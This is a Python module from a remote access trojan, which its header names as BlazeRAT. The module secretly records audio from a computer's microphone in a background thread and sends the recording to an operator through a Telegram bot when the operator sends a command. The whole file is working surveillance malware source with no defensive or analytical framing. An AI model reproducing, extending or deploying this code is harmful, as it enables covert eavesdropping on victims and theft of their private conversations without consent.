#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from io import BytesIO
from core.logger import Log
from threading import Thread
from wave import open as wave_open # pip3 install wave
from pyaudio import paInt16, PyAudio # pip3 install pyaudio
from core.messages import services as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to record audio from a microphone
"""

# Settings
FORMAT = paInt16
CHUNK = 1024
CHANNELS = 2
RATE = 44100

# Global variables
global r, p, t, stream, frames
r, p, t, stream, frames = False, None, None, None, []

""" Record voice from microphone """
def _RecordMicrophone():
    # Initialize
    global r, p, stream, frames
    frames = []
    r = True
    p = PyAudio()
    stream = p.open(format=FORMAT,
        channels=CHANNELS,
        rate=RATE,
        input=True,
        frames_per_buffer=CHUNK)
    # Record microphone
    while r:
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()

""" Asynchronously record voice from microphone """
def _StartAsync():
    global r, t
    if r: return False
    try:
        t = Thread(target=_RecordMicrophone)
        t.start()
    except Exception as error:
        print(error)
        r = False
    else:
        return True

""" Stop recording """
def _Stop() -> bytes:
    global r, p, t, stream, frames
    if not r: return False
    r = False
    t.join()
    # Write to memory
    obj = BytesIO()
    wf = wave_open(obj, "wb")
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return obj.getvalue()

""" Handle telegram command """
def Handle(callback: dict, bot) -> None:
    text = callback.data
    chatid = callback.from_user.id
    # Start microphone recording
    if "Enable" in text:
        # Start voice recording
        voice = _StartAsync()
        if voice != False:
            Log(f"Microphone >> Start voice recording", chatid)
            bot.send_message(chatid, Messages.microphone_recording_started)
            bot.send_chat_action(chatid, "record_audio")
        # Send error message if recording already started
        else:
            bot.send_message(chatid, Messages.microphone_recording_not_stopped)
    # Stop microphone recording
    elif "Disable" in text:
        # Send recorded voice message
        voice = _Stop()
        if voice != False:
            Log(f"Microphone >> Stop voice recording", chatid)
            bot.send_chat_action(chatid, "upload_audio")
            bot.send_voice(
                chat_id=chatid, voice=voice,
                reply_to_message_id=callback.message.message_id,
                caption=Messages.microphone_recording_stopped
            )
        # Send error message if recording not started
        else:
            bot.send_message(chatid, Messages.microphone_recording_not_started)
